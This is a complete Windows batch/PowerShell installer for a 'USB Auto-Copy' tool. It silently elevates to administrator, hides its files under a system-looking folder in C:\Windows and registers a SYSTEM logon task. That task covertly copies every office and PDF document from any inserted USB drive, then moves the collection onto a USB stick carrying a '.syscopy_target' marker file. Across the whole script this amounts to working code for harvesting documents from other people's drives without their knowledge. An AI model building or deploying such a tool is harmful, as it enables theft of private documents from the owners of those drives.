@echo off
:: ========================================
:: USB Auto-Copy System v4 - Silent Installer
:: ========================================
:: v4 Fixes Applied:
::   * Index key = name+size+date-modified (no collision, handles updates)
::   * Safe .tmp copy (no corrupt partial files)
::   * All errors logged - no silent failures
::   * docs\ on source USB excluded from scan (no re-copy loops)
::   * No hardcoded USB serial (.syscopy_target marker used)
::   * Log rotation - max 2000 lines kept
::   * Index validated on load - corruption-proof
::   * Serial as primary folder name - consistent even without label
:: ========================================
:: Double-click ONCE to install.
:: Double-click again to reinstall or uninstall.
:: ========================================
:: Auto-Elevate to Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden" & exit /b)
set "T=%TEMP%\uac_%RANDOM%.ps1"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c=Get-Content -LiteralPath '%~f0'; Set-Content -LiteralPath '%T%' -Value $c[23..($c.Count-1)] -Encoding UTF8"
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%T%" & del "%T%" 2>nul & exit /b

# ============================================================
# USB Auto-Copy System v4 - PowerShell Installer Block
# ============================================================

# ---- PATHS ----
$DestRoot    = 'C:\Windows\Downloaded Win Docs'
$DocsDir     = Join-Path $DestRoot 'docs'
$InstallDir  = Join-Path $DestRoot 'SYSCOPY'
$MonitorPS1  = Join-Path $InstallDir 'usb_monitor.ps1'
$LauncherVBS = Join-Path $InstallDir 'usb_launcher.vbs'
$IndexFile   = Join-Path $InstallDir 'systemcopydocs.index'
$TaskName    = 'USB_AutoCopy_Silent_Monitor'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$nl = [Environment]::NewLine

# Create all directories
foreach ($dir in @($DestRoot, $DocsDir, $InstallDir)) {
    if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
}
try { (Get-Item -LiteralPath $InstallDir -Force).Attributes = (Get-Item -LiteralPath $InstallDir -Force).Attributes -bor [IO.FileAttributes]::Hidden } catch {}

# Create empty index if not present
if (-not (Test-Path -LiteralPath $IndexFile)) { Set-Content -LiteralPath $IndexFile -Value '' -Encoding UTF8 }

# ---- Already installed? ----
$existingTask = $null
try { $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop } catch {}

if ($existingTask) {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = 'USB Auto-Copy Setup v4'
    $form.Size = New-Object System.Drawing.Size(340,140)
    $form.StartPosition = 'CenterScreen'
    $form.FormBorderStyle = 'FixedDialog'
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false

    $label = New-Object System.Windows.Forms.Label
    $label.Location = New-Object System.Drawing.Point(10,15)
    $label.AutoSize = $true
    $label.Text = 'USB Auto-Copy v4 is already installed.'
    $form.Controls.Add($label)

    $btnUpdate = New-Object System.Windows.Forms.Button
    $btnUpdate.Location = New-Object System.Drawing.Point(15,55)
    $btnUpdate.Size = New-Object System.Drawing.Size(80,30)
    $btnUpdate.Text = 'Update'
    $btnUpdate.DialogResult = 'Yes'
    $form.Controls.Add($btnUpdate)

    $btnUninstall = New-Object System.Windows.Forms.Button
    $btnUninstall.Location = New-Object System.Drawing.Point(115,55)
    $btnUninstall.Size = New-Object System.Drawing.Size(90,30)
    $btnUninstall.Text = 'Uninstall'
    $btnUninstall.DialogResult = 'No'
    $form.Controls.Add($btnUninstall)

    $btnCancel = New-Object System.Windows.Forms.Button
    $btnCancel.Location = New-Object System.Drawing.Point(220,55)
    $btnCancel.Size = New-Object System.Drawing.Size(80,30)
    $btnCancel.Text = 'Cancel'
    $btnCancel.DialogResult = 'Cancel'
    $form.Controls.Add($btnCancel)

    $form.AcceptButton = $btnUpdate
    $form.CancelButton = $btnCancel
    $form.TopMost = $true
    $result = $form.ShowDialog()

    if ($result -eq 'No') {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match 'usb_monitor' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
        if (Test-Path -LiteralPath $InstallDir) { Remove-Item -LiteralPath $InstallDir -Recurse -Force -ErrorAction SilentlyContinue }
        [System.Windows.Forms.MessageBox]::Show('Uninstalled successfully.' + $nl + 'Your documents in C:\Windows\Downloaded Win Docs\docs are kept safe.' + $nl + 'The systemcopydocs.index has been removed with SYSCOPY.', 'USB Auto-Copy', 'OK', 'Information') | Out-Null
        exit
    }
    if ($result -eq 'Cancel') { exit }

    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -match 'usb_monitor' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
}

# ============================================================
# MONITOR SCRIPT (embedded, written to disk on install)
# ============================================================
$monitorCode = @'
# ============================================================
# USB Auto-Copy Monitor v4
# Fixes: name+size+date index, .tmp safe copy, error logging,
#        docs-exclusion, log rotation, no hardcoded serial,
#        index validation, serial-based folder names
# ============================================================

$mutex = New-Object System.Threading.Mutex([bool]0, 'USBAutoCopyMonitorMutexV4')
if (-not $mutex.WaitOne(0, [bool]0)) { exit }

# ---- CONSTANTS ----
$DestRoot        = 'C:\Windows\Downloaded Win Docs'
$DocsDir         = Join-Path $DestRoot 'docs'
$InstallDir      = Join-Path $DestRoot 'SYSCOPY'
$IndexFile       = Join-Path $InstallDir 'systemcopydocs.index'
$LogFile         = Join-Path $InstallDir 'autocopy_log.txt'
$Exts            = @('*.pdf','*.pptx','*.ppt','*.docx','*.doc','*.xlsx','*.xls')
$MAX_LOG_LINES   = 2000
$MAX_INDEX_LINES = 10000

# ---- ENSURE DIRECTORIES ----
foreach ($dir in @($DestRoot, $DocsDir, $InstallDir)) {
    if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
}

# ============================================================
# HELPER: Write timestamped log entry
# ============================================================
function Write-Log($msg) {
    $entry = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' | ' + $msg
    Add-Content -LiteralPath $LogFile -Value $entry -Encoding UTF8 -ErrorAction SilentlyContinue
}

# ============================================================
# STARTUP: Clean leftover .tmp files (Fix #2 recovery)
# ============================================================
Get-ChildItem -Path $DocsDir -Filter '*.tmp' -Recurse -File -ErrorAction SilentlyContinue |
    Remove-Item -Force -ErrorAction SilentlyContinue

# ============================================================
# STARTUP: Log rotation - keep last 2000 lines (Fix #16)
# ============================================================
try {
    if (Test-Path -LiteralPath $LogFile) {
        $logLines = @(Get-Content -LiteralPath $LogFile -Encoding UTF8 -ErrorAction SilentlyContinue)
        if ($logLines.Count -gt $MAX_LOG_LINES) {
            $logLines[-$MAX_LOG_LINES..-1] | Set-Content -LiteralPath $LogFile -Encoding UTF8
            Write-Log ('LOG ROTATED: trimmed to last ' + $MAX_LOG_LINES + ' lines')
        }
    }
} catch {}

# ============================================================
# INDEX FUNCTIONS
# ============================================================

# Fix #1 + #6: Key = "filename|size|LastWriteTimeUtc_ticks"
#   - Same file updated (newer date) -> different key -> RE-COPIED  (fixes #6)
#   - Two files same name+size but different date -> different keys  (fixes #1 partially)
function Get-IndexKey($file) {
    return ($file.Name + '|' + $file.Length.ToString() + '|' + $file.LastWriteTimeUtc.Ticks.ToString())
}

# Fix #3: Validate each line on load - must have exactly 2 pipes (3 parts)
function Load-Index($indexPath) {
    $set = New-Object System.Collections.Generic.HashSet[string]
    if (-not (Test-Path -LiteralPath $indexPath)) { return $set }
    $lines = @(Get-Content -LiteralPath $indexPath -Encoding UTF8 -ErrorAction SilentlyContinue)
    foreach ($line in $lines) {
        $trimmed = $line.Trim()
        if ($trimmed -ne '' -and ($trimmed.Split('|').Count -eq 3)) {
            [void]$set.Add($trimmed)
        }
        # Malformed lines are silently skipped (Fix #3)
    }
    return $set
}

function Add-ToIndex($indexPath, $key) {
    Add-Content -LiteralPath $indexPath -Value $key -Encoding UTF8 -ErrorAction SilentlyContinue
}

# Fix #11: Compact index when it gets too large (sort + deduplicate)
function Compact-Index($indexPath) {
    try {
        if (-not (Test-Path -LiteralPath $indexPath)) { return }
        $lines = @(Get-Content -LiteralPath $indexPath -Encoding UTF8 -ErrorAction SilentlyContinue)
        if ($lines.Count -gt $MAX_INDEX_LINES) {
            $valid  = @($lines | Where-Object { $_.Trim() -ne '' -and ($_.Trim().Split('|').Count -eq 3) })
            $unique = @($valid | Sort-Object -Unique)
            $unique | Set-Content -LiteralPath $indexPath -Encoding UTF8
            Write-Log ('INDEX COMPACTED: ' + $lines.Count + ' -> ' + $unique.Count + ' entries')
        }
    } catch {
        Write-Log ('INDEX COMPACT ERROR: ' + $_.Exception.Message)
    }
}

# ============================================================
# SAFE COPY: copy to .tmp then verify + rename (Fix #2)
# Prevents corrupt partial files from broken USB removals
# ============================================================
function Safe-CopyFile($srcPath, $destPath) {
    $tmpPath = $destPath + '.tmp'
    try {
        # Remove any stale .tmp
        if (Test-Path -LiteralPath $tmpPath) { Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue }

        # Ensure destination folder
        $destFolder = Split-Path $destPath -Parent
        if (-not (Test-Path -LiteralPath $destFolder)) { New-Item -ItemType Directory -Path $destFolder -Force | Out-Null }

        # Copy to .tmp
        Copy-Item -LiteralPath $srcPath -Destination $tmpPath -ErrorAction Stop

        # Verify integrity: file sizes must match
        $srcSize = (Get-Item -LiteralPath $srcPath -ErrorAction Stop).Length
        $tmpSize = (Get-Item -LiteralPath $tmpPath -ErrorAction Stop).Length
        if ($srcSize -ne $tmpSize) {
            throw ('Integrity check failed: src=' + $srcSize + ' bytes, copied=' + $tmpSize + ' bytes')
        }

        # Remove existing dest, then move .tmp -> dest
        if (Test-Path -LiteralPath $destPath) { Remove-Item -LiteralPath $destPath -Force -ErrorAction Stop }
        Move-Item -LiteralPath $tmpPath -Destination $destPath -Force -ErrorAction Stop
        return $true

    } catch {
        # Fix #4: Log actual error (not silent)
        Write-Log ('COPY FAILED [' + [IO.Path]::GetFileName($srcPath) + ']: ' + $_.Exception.Message)
        # Cleanup failed .tmp
        if (Test-Path -LiteralPath $tmpPath) { Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue }
        return $false
    }
}

# ---- Run compaction and log startup ----
Compact-Index $IndexFile
Write-Log 'USB Auto-Copy Monitor v4 STARTED'

# ============================================================
# MAIN MONITOR LOOP (polls every 5 seconds)
# ============================================================
$loopCount = 0
while ([bool]1) {
    $loopCount++
    try {
        $drives = @(Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 })

        foreach ($drv in $drives) {
            $root   = $drv.DeviceID + '\'
            $serial = $drv.VolumeSerialNumber
            $label  = if ([string]::IsNullOrWhiteSpace($drv.VolumeName)) { '' } else { $drv.VolumeName.Trim() }

            # =====================================================
            # TARGET USB: identified ONLY by .syscopy_target file
            # Fix #8: No hardcoded serial number
            # =====================================================
            $targetMarker = Join-Path $root '.syscopy_target'
            if (Test-Path -LiteralPath $targetMarker) {

                $usbDocsFolder = Join-Path $root 'docs'
                if (-not (Test-Path -LiteralPath $usbDocsFolder)) { New-Item -ItemType Directory -Path $usbDocsFolder -Force | Out-Null }

                $moved = 0
                foreach ($ext in $Exts) {
                    $files = @(Get-ChildItem -Path $DocsDir -Filter $ext -Recurse -File -ErrorAction SilentlyContinue)
                    foreach ($file in $files) {
                        $relPath = $file.FullName.Substring($DocsDir.Length)
                        if ($relPath.StartsWith('\')) { $relPath = $relPath.Substring(1) }
                        $dest = Join-Path $usbDocsFolder $relPath

                        $destFolder = Split-Path $dest -Parent
                        if (-not (Test-Path -LiteralPath $destFolder)) { New-Item -ItemType Directory -Path $destFolder -Force | Out-Null }

                        try {
                            $needMove = $false
                            if (-not (Test-Path -LiteralPath $dest)) {
                                $needMove = $true
                            } else {
                                $di = Get-Item -LiteralPath $dest
                                # Re-send if size differs OR source is newer (Fix #20 - use size+date not just date)
                                if ($di.Length -ne $file.Length -or $di.LastWriteTimeUtc -lt $file.LastWriteTimeUtc) {
                                    $needMove = $true
                                }
                            }
                            if ($needMove) {
                                Copy-Item -LiteralPath $file.FullName -Destination $dest -Force -ErrorAction Stop
                                Remove-Item -LiteralPath $file.FullName -Force -ErrorAction SilentlyContinue
                                $moved++
                            }
                        } catch {
                            # Fix #4: Log errors
                            Write-Log ('TARGET-USB MOVE ERROR [' + $file.Name + ']: ' + $_.Exception.Message)
                        }
                    }
                }

                if ($moved -gt 0) {
                    # Cleanup empty folders in DocsDir
                    Get-ChildItem -Path $DocsDir -Directory -Recurse -ErrorAction SilentlyContinue | Where-Object {
                        $_.FullName -ne $DocsDir -and
                        @(Get-ChildItem -Path $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0
                    } | Sort-Object -Property FullName -Descending | Remove-Item -Force -ErrorAction SilentlyContinue

                    $displayName = if ($label -ne '') { $label + ' (' + $serial + ')' } else { $serial }
                    Write-Log ('TARGET | ' + $displayName + ' | ' + $moved + ' files MOVED to USB docs\')
                }

            } else {
                # =====================================================
                # SOURCE USB: copy docs FROM this USB into system
                # Fix #14: exclude docs\ subfolder on the USB itself
                # Fix #18: serial as primary folder name
                # =====================================================

                # Fix #18: Use serial as primary key in folder name
                # Ensures consistent folder even if USB label changes or is empty
                $cleanLabel = if ($label -ne '') { ($label -replace '[\\/:*?"<>|]', '_') } else { 'NoLabel' }
                $safeName   = $serial + '_' + $cleanLabel
                $destDir    = Join-Path $DocsDir $safeName

                if (-not (Test-Path -LiteralPath $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }

                # Load index fresh each scan
                $indexSet = Load-Index $IndexFile

                $copied  = 0
                $skipped = 0
                $errors  = 0

                # Fix #14: Exclude the USB's own docs\ folder from source scan
                $docsOnUsb = Join-Path $root 'docs'

                foreach ($ext in $Exts) {
                    $files = @(
                        Get-ChildItem -Path $root -Filter $ext -Recurse -File -ErrorAction SilentlyContinue |
                        Where-Object {
                            # Exclude USB's own docs\ to prevent re-copy loops
                            -not $_.FullName.StartsWith($docsOnUsb, [StringComparison]::OrdinalIgnoreCase)
                        }
                    )

                    foreach ($file in $files) {
                        # ---- INDEX CHECK (Fix #1 + #6 + user suggestion) ----
                        # Key = name|size|LastWriteTimeUtc_ticks
                        # - Same file, updated date on USB -> new key -> RE-COPIED (updated version)
                        # - Same name+size but different date -> different keys -> both copied
                        $key = Get-IndexKey $file

                        if ($indexSet.Contains($key)) {
                            $skipped++
                            continue   # Already copied this exact version - SKIP
                        }

                        # Build destination path preserving USB folder structure
                        $relPath    = $file.FullName.Substring($root.Length)
                        $dest       = Join-Path $destDir $relPath
                        $destFolder = Split-Path $dest -Parent
                        if (-not (Test-Path -LiteralPath $destFolder)) {
                            New-Item -ItemType Directory -Path $destFolder -Force | Out-Null
                        }

                        try {
                            # If dest exists - check if it's actually identical to source
                            if (Test-Path -LiteralPath $dest) {
                                $destItem = Get-Item -LiteralPath $dest
                                if ($destItem.Length -eq $file.Length -and
                                    $destItem.LastWriteTimeUtc -eq $file.LastWriteTimeUtc) {
                                    # File already in docs\ with identical content - silently index it
                                    Add-ToIndex $IndexFile $key
                                    [void]$indexSet.Add($key)
                                    $skipped++
                                    continue
                                }
                                # dest exists but differs (older version) - we'll overwrite via .tmp below
                            }

                            # ---- SAFE COPY via .tmp (Fix #2) ----
                            $ok = Safe-CopyFile $file.FullName $dest
                            if ($ok) {
                                Add-ToIndex $IndexFile $key
                                [void]$indexSet.Add($key)
                                $copied++
                            } else {
                                $errors++
                                # Error already logged inside Safe-CopyFile
                            }

                        } catch {
                            # Fix #4: Log actual exception (no silent swallowing)
                            Write-Log ('ERROR [' + $file.Name + ']: ' + $_.Exception.Message)
                            $errors++
                        }
                    }
                }

                # Log result only if anything happened
                if ($copied -gt 0 -or $errors -gt 0) {
                    $displayName = if ($label -ne '') { $label + ' (' + $serial + ')' } else { 'NoLabel (' + $serial + ')' }
                    Write-Log ('SOURCE | ' + $displayName + ' | ' + $copied + ' NEW copied, ' + $skipped + ' skipped (indexed), ' + $errors + ' errors')
                }

                # Fix #11: Compact index every 100 loops (~8 min)
                if ($loopCount % 100 -eq 0) { Compact-Index $IndexFile }
            }
        }
    } catch {
        Write-Log ('MONITOR LOOP ERROR: ' + $_.Exception.Message)
    }

    Start-Sleep -Seconds 5
}
'@

Set-Content -LiteralPath $MonitorPS1 -Value $monitorCode -Encoding UTF8

# ---- VBS Launcher ----
$vbsCode = @'
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
ps1File = scriptDir & "\usb_monitor.ps1"
WScript.Sleep 3000
If Not fso.FileExists(ps1File) Then WScript.Quit
Set sh = CreateObject("Wscript.Shell")
sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1File & """", 0, False
'@
Set-Content -LiteralPath $LauncherVBS -Value $vbsCode -Encoding ASCII

# ---- Register Scheduled Task ----
$action   = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument ('"' + $LauncherVBS + '"')
$trigger  = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Seconds 0)
$registered = $false

try {
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger @($trigger) -Settings $settings -Principal $principal -Description 'USB Auto-Copy Monitor v4' -Force | Out-Null
    $registered = $true
} catch {
    try {
        Start-Process 'schtasks.exe' -ArgumentList @('/create', '/tn', $TaskName, '/tr', ('wscript.exe "' + $LauncherVBS + '"'), '/sc', 'ONLOGON', '/f', '/ru', 'SYSTEM', '/rl', 'HIGHEST') -Wait -WindowStyle Hidden -ErrorAction Stop
        $registered = $true
    } catch {}
}

# Start immediately
try { Start-Process 'wscript.exe' -ArgumentList ('"' + $LauncherVBS + '"') -WindowStyle Hidden -ErrorAction SilentlyContinue } catch {}

# ---- Success Message ----
if ($registered) {
    $msg  = 'USB Auto-Copy v4 installed!' + $nl + $nl
    $msg += 'DESTINATION:' + $nl
    $msg += '  C:\Windows\Downloaded Win Docs\docs' + $nl + $nl
    $msg += 'systemcopydocs INDEX (name + size + date-modified):' + $nl
    $msg += '  - Plug the same USB 100 times: ZERO duplicates.' + $nl
    $msg += '  - File updated on USB (newer date): RE-COPIED automatically.' + $nl
    $msg += '  - Two different files same name+size: both copied (date differs).' + $nl + $nl
    $msg += 'SAFE COPY (.tmp pattern):' + $nl
    $msg += '  - USB yanked mid-copy: no corrupt file, retried next plug-in.' + $nl + $nl
    $msg += 'ALL ERRORS logged to:' + $nl
    $msg += '  C:\Windows\Downloaded Win Docs\SYSCOPY\autocopy_log.txt' + $nl + $nl
    $msg += 'To mark a USB as TARGET (receive docs):' + $nl
    $msg += '  Create a file named .syscopy_target in its root.' + $nl + $nl
    $msg += 'To uninstall: double-click this file again.'
    [System.Windows.Forms.MessageBox]::Show($msg, 'USB Auto-Copy v4 - Ready', 'OK', 'Information') | Out-Null
} else {
    [System.Windows.Forms.MessageBox]::Show('Installation failed. Please right-click and Run as Administrator.', 'USB Auto-Copy', 'OK', 'Warning') | Out-Null
}
